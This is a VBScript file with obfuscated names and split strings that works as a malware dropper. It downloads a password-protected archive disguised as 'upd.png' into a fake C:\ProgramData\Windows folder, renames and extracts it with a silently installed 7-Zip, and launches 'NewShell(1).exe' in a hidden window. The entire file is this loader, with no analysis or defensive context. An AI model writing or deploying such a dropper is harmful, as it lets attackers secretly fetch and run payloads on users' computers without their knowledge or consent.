Option Explicit

Function x1(x2)
    x1 = Replace(x2, "[" & Chr(43) & "]", "")
End Function

Sub x3(x4, x5)
    On Error Resume Next
    Dim x6, x7
    Set x6 = CreateObject("Mic" & "ros" & "oft.XMLHTTP")
    x6.Open "GET", x4, False
    x6.Send
    If x6.Status = 200 Then
        Set x7 = CreateObject("ADO" & "DB.Stream")
        x7.Type = 1
        x7.Open
        x7.Write x6.ResponseBody
        x7.SaveToFile x5, 2
        x7.Close
    Else
        MsgBox "Err: " & x6.Status
        WScript.Quit
    End If
End Sub

Sub x8(x9, x10)
    On Error Resume Next
    Dim x11
    Set x11 = CreateObject("Scripting.FileSystemObject")
    If x11.FileExists(x9) Then
        x11.MoveFile x9, x10
    Else
        MsgBox "Missing: " & x9
        WScript.Quit
    End If
End Sub

Function x12()
    Dim x13
    Set x13 = CreateObject("Scripting.FileSystemObject")
    x12 = x13.FileExists(x1("C:[+]\\Progra" & "m Files[+]\\7-Zip\\7z.exe"))
End Function

Sub x14()
    Dim x15, x16, x17
    x15 = x1("https:[+]//www.7-zip.org[+]/a/7z2301-x64.exe")
    x16 = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
    x17 = x16 & "\t1.exe"
    x3 x15, x17
    CreateObject("WScript.Shell").Run """" & x17 & """ /S", 0, True
End Sub

Sub x18(x19, x20, x21)
    Dim x22, x23, x24
    x23 = """C:\Program Files\7-Zip\7z.exe"""
    x22 = x23 & " x """ & x19 & """ -o""" & x20 & """ -p" & x21 & " -y"
    Set x24 = CreateObject("WScript.Shell")
    x24.Run "cmd /c """ & x22 & """", 0, True

    If Not CreateObject("Scripting.FileSystemObject").FileExists(x20 & "\NewShell(1).exe") Then
        MsgBox "Extraction failed."
        WScript.Quit
    End If
End Sub

Sub x25(x26)
    Dim x27
    Set x27 = CreateObject("WScript.Shell")
    x27.Run """" & x26 & """", 0, False
End Sub

Sub xMain()
    On Error Resume Next
    Dim a, b, c, d, e, f
    a = x1("http://127.0.0.1/Downloads/NewShell%281%29.zip")
    b = "C:\ProgramData\Win" & "dows"
    c = b & "\upd.png"
    d = b & "\upd.zip"
    e = "123"
    f = b & "\NewShell(1).exe"

    Dim g
    Set g = CreateObject("Scripting.FileSystemObject")
    If Not g.FolderExists(b) Then
        g.CreateFolder b
    End If

    x3 a, c
    x8 c, d

    If Not x12() Then
        MsgBox "Installing 7z..."
        x14
        WScript.Sleep 10000
    End If

    x18 d, b, e

    If g.FileExists(f) Then
        x25 f
    Else
        MsgBox "EXE not found: " & f
        WScript.Quit
    End If
End Sub

xMain
